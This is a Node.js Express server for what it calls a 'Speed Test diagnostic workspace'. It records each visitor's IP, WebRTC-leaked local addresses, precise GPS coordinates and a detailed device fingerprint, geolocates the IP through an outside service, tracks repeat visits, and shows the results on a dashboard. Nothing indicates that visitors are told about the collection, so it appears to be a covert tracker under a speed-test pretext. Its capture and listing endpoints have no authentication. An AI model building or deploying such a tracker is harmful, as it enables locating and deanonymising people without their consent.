const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = Number(process.env.PORT) || 3000;
const IS_VERCEL = !!process.env.VERCEL;
const DATA_DIR = IS_VERCEL ? '/tmp/data' : path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'captures.json');

app.use(express.json({ limit: '128kb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));

function ensureDataFile() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, '[]\n', 'utf8');
}

function fallbackGeo() {
  return {
    city: 'Local',
    region: '-',
    country: '-',
    countryCode: '-',
    lat: 0,
    lon: 0,
    isp: 'localhost',
    asn: '-',
  };
}

function normalizeCapture(entry) {
  const fingerprint = entry.fingerprint || {};
  const deviceId = entry.deviceId || generateDeviceHash(fingerprint, entry.ip || 'unknown');

  return {
    id: entry.id || createId(),
    deviceId,
    timestamp: entry.timestamp || new Date().toISOString(),
    ip: entry.ip || 'unknown',
    ipGeo: entry.ipGeo || fallbackGeo(),
    webrtcIPs: Array.isArray(entry.webrtcIPs) ? entry.webrtcIPs : [],
    gps: entry.gps || null,
    fingerprint,
    visitCount: Number(entry.visitCount) || 1,
  };
}

function readCaptures() {
  ensureDataFile();

  try {
    const parsed = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    return Array.isArray(parsed) ? parsed.map(normalizeCapture) : [];
  } catch {
    return [];
  }
}

function writeCaptures(data) {
  ensureDataFile();
  fs.writeFileSync(DATA_FILE, `${JSON.stringify(data.map(normalizeCapture), null, 2)}\n`, 'utf8');
}

function getClientIP(req) {
  const raw =
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.socket.remoteAddress ||
    'unknown';

  return raw.replace('::ffff:', '');
}

function sanitizeString(value, maxLength = 240) {
  if (typeof value !== 'string') return '';
  return value.replace(/\0/g, '').trim().slice(0, maxLength);
}

function sanitizeNumber(value, fallback = 0) {
  const num = Number(value);
  return Number.isFinite(num) ? num : fallback;
}

function sanitizeGps(gps) {
  if (!gps || typeof gps !== 'object') return null;

  const lat = Number(gps.lat);
  const lon = Number(gps.lon);
  if (!Number.isFinite(lat) || !Number.isFinite(lon)) return null;
  if (lat < -90 || lat > 90 || lon < -180 || lon > 180) return null;

  return {
    lat,
    lon,
    accuracy: sanitizeNumber(gps.accuracy, 0),
    altitude: Number.isFinite(Number(gps.altitude)) ? Number(gps.altitude) : null,
    altitudeAccuracy: Number.isFinite(Number(gps.altitudeAccuracy)) ? Number(gps.altitudeAccuracy) : null,
    heading: Number.isFinite(Number(gps.heading)) ? Number(gps.heading) : null,
    speed: Number.isFinite(Number(gps.speed)) ? Number(gps.speed) : null,
  };
}

function createFingerprint(req) {
  return {
    userAgent: sanitizeString(req.headers['user-agent'] || req.body.userAgent || '', 600),
    language: sanitizeString(req.body.language, 80),
    platform: sanitizeString(req.body.platform, 120),
    screenRes: sanitizeString(req.body.screenRes, 40),
    timezone: sanitizeString(req.body.timezone, 120),
    cores: sanitizeNumber(req.body.cores, 0),
    memory: sanitizeNumber(req.body.memory, 0),
    gpu: sanitizeString(req.body.gpu, 240),
    touchSupport: Boolean(req.body.touchSupport),
    connectionType: sanitizeString(req.body.connectionType, 40),
  };
}

function createId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
}

function generateDeviceHash(fingerprint, ip) {
  const key = [
    fingerprint.userAgent,
    fingerprint.screenRes,
    fingerprint.timezone,
    fingerprint.cores,
    fingerprint.gpu,
    fingerprint.platform,
    ip,
  ].join('|');

  return `dev_${crypto.createHash('sha256').update(key).digest('hex').slice(0, 14)}`;
}

async function resolveIPGeo(ip) {
  if (!ip || ip === '::1' || ip === '127.0.0.1' || ip === 'unknown') {
    return fallbackGeo();
  }

  try {
    const resp = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, {
      headers: { 'User-Agent': 'Speed Test Research Dashboard' },
    });

    if (!resp.ok) return fallbackGeo();

    const geo = await resp.json();
    if (geo.error) return fallbackGeo();

    return {
      city: geo.city || '-',
      region: geo.region || '-',
      country: geo.country_name || '-',
      countryCode: geo.country_code || '-',
      lat: sanitizeNumber(geo.latitude, 0),
      lon: sanitizeNumber(geo.longitude, 0),
      isp: geo.org || '-',
      asn: geo.asn || '-',
    };
  } catch {
    return fallbackGeo();
  }
}

function createCapture(req, extra = {}) {
  const captures = readCaptures();
  const clientIP = extra.ip || getClientIP(req);
  const fingerprint = extra.fingerprint || createFingerprint(req);
  const deviceId =
    sanitizeString(extra.deviceId || req.body.deviceId, 120) ||
    generateDeviceHash(fingerprint, clientIP);

  const previousVisits = captures.filter((capture) => capture.deviceId === deviceId);

  return {
    id: createId(),
    deviceId,
    timestamp: new Date().toISOString(),
    ip: clientIP,
    ipGeo: extra.ipGeo || null,
    webrtcIPs: Array.isArray(extra.webrtcIPs)
      ? extra.webrtcIPs
      : Array.isArray(req.body.webrtcIPs)
        ? req.body.webrtcIPs.map((ip) => sanitizeString(ip, 80)).filter(Boolean).slice(0, 8)
        : [],
    gps: sanitizeGps(extra.gps || req.body.gps),
    fingerprint,
    visitCount: previousVisits.length + 1,
  };
}

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', captures: readCaptures().length, time: new Date().toISOString() });
});

app.get('/api/client-info', async (req, res) => {
  const ip = getClientIP(req);
  const ipGeo = await resolveIPGeo(ip);
  res.json({
    ip,
    ipGeo,
    userAgent: req.headers['user-agent'] || '',
    language: req.headers['accept-language'] || '',
  });
});

app.post('/api/capture', async (req, res) => {
  const captures = readCaptures();
  const entry = createCapture(req);
  entry.ipGeo = await resolveIPGeo(entry.ip);

  captures.push(entry);
  writeCaptures(captures);

  console.log(
    `[CAPTURE] ${entry.id} | Device: ${entry.deviceId} | IP: ${entry.ip} | Visit #${entry.visitCount} | GPS: ${entry.gps ? 'yes' : 'no'}`
  );

  res.json({ status: 'ok', id: entry.id });
});

app.post('/api/demo-capture', (req, res) => {
  const captures = readCaptures();
  const now = Date.now();
  const demoDeviceId = `demo_${crypto.randomBytes(4).toString('hex')}`;
  const cities = [
    { city: 'Basra', region: 'Basra', country: 'Iraq', countryCode: 'IQ', lat: 30.5085, lon: 47.7804, isp: 'EarthLink', asn: 'AS50710' },
    { city: 'Baghdad', region: 'Baghdad', country: 'Iraq', countryCode: 'IQ', lat: 33.3152, lon: 44.3661, isp: 'IQ Networks', asn: 'AS44217' },
    { city: 'Erbil', region: 'Kurdistan', country: 'Iraq', countryCode: 'IQ', lat: 36.1901, lon: 44.0092, isp: 'Newroz Telecom', asn: 'AS21277' },
    { city: 'Dubai', region: 'Dubai', country: 'United Arab Emirates', countryCode: 'AE', lat: 25.2048, lon: 55.2708, isp: 'Etisalat', asn: 'AS5384' },
  ];
  const city = cities[Math.floor(Math.random() * cities.length)];

  const entry = normalizeCapture({
    id: createId(),
    deviceId: demoDeviceId,
    timestamp: new Date(now).toISOString(),
    ip: `203.0.113.${Math.floor(Math.random() * 180) + 20}`,
    ipGeo: city,
    webrtcIPs: Math.random() > 0.35 ? [`10.0.${Math.floor(Math.random() * 50)}.${Math.floor(Math.random() * 220) + 10}`] : [],
    gps: Math.random() > 0.25
      ? {
          lat: city.lat + (Math.random() - 0.5) * 0.03,
          lon: city.lon + (Math.random() - 0.5) * 0.03,
          accuracy: Math.floor(Math.random() * 70) + 18,
          altitude: null,
          altitudeAccuracy: null,
          heading: null,
          speed: null,
        }
      : null,
    fingerprint: {
      userAgent:
        Math.random() > 0.5
          ? 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148'
          : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/147.0.0.0 Safari/537.36',
      language: 'en-US',
      platform: Math.random() > 0.5 ? 'iPhone' : 'MacIntel',
      screenRes: Math.random() > 0.5 ? '390x844' : '1440x900',
      timezone: 'Asia/Baghdad',
      cores: Math.random() > 0.5 ? 6 : 10,
      memory: Math.random() > 0.5 ? 4 : 16,
      gpu: 'Demo GPU',
      touchSupport: Math.random() > 0.5,
      connectionType: Math.random() > 0.5 ? '4g' : 'wifi',
    },
    visitCount: 1,
  });

  captures.push(entry);
  writeCaptures(captures);

  res.json({ status: 'ok', id: entry.id });
});

app.patch('/api/capture/:id', (req, res) => {
  const captures = readCaptures();
  const entry = captures.find((capture) => capture.id === req.params.id);
  if (!entry) return res.status(404).json({ error: 'Capture not found' });

  const gps = sanitizeGps(req.body.gps);
  if (gps) {
    entry.gps = gps;
    console.log(`[GPS UPDATE] ${entry.id} | Lat: ${gps.lat}, Lon: ${gps.lon}, Accuracy: ${gps.accuracy}m`);
  }

  if (Array.isArray(req.body.webrtcIPs)) {
    entry.webrtcIPs = req.body.webrtcIPs.map((ip) => sanitizeString(ip, 80)).filter(Boolean).slice(0, 8);
  }

  writeCaptures(captures);
  res.json({ status: 'updated' });
});

app.get('/api/captures', (req, res) => {
  res.json(readCaptures());
});

app.delete('/api/captures', (req, res) => {
  writeCaptures([]);
  res.json({ status: 'cleared' });
});

app.delete('/api/captures/:id', (req, res) => {
  const before = readCaptures();
  const captures = before.filter((capture) => capture.id !== req.params.id);
  writeCaptures(captures);

  if (captures.length === before.length) return res.json({ status: 'already_deleted' });
  res.json({ status: 'deleted', deleted: before.length - captures.length });
});

app.delete('/api/devices/:deviceId', (req, res) => {
  const before = readCaptures();
  const captures = before.filter((capture) => capture.deviceId !== req.params.deviceId);
  writeCaptures(captures);

  if (captures.length === before.length) return res.json({ status: 'already_deleted' });
  res.json({ status: 'deleted', deleted: before.length - captures.length });
});

app.use((req, res) => {
  res.status(404).json({ error: 'Not found' });
});

app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: 'Server error' });
});

function startServer(port, attempts = 0) {
  const server = app.listen(port, () => {
    console.log(`
Speed Test diagnostic workspace
Main page:  http://localhost:${port}
Dashboard:  http://localhost:${port}/dashboard
`);
  });

  server.on('error', (err) => {
    if (err.code === 'EADDRINUSE' && !process.env.PORT && attempts < 10) {
      const nextPort = port + 1;
      console.warn(`Port ${port} is in use. Trying ${nextPort}...`);
      startServer(nextPort, attempts + 1);
      return;
    }

    console.error(err);
    process.exitCode = 1;
  });
}

ensureDataFile();

if (!IS_VERCEL) {
  startServer(PORT);
}

module.exports = app;
